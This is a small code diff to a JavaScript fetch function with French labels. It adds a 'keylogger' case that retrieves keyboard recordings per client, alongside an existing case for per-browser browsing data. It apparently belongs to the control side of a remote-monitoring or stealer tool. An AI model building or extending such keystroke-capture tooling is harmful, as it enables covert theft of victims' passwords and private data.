@@ -20,6 +20,10 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
             endpoint = `browser/client/${clientId}/${browser}`;
             contentType = "donnée de navigation";
             break;
+        case 'keylogger':
+            endpoint = `keylogger/client/${clientId}`;
+            contentType = "enregistrement du clavier";
+            break;
     }
 
     const url = `${API_BASE_URL}/${endpoint}`;
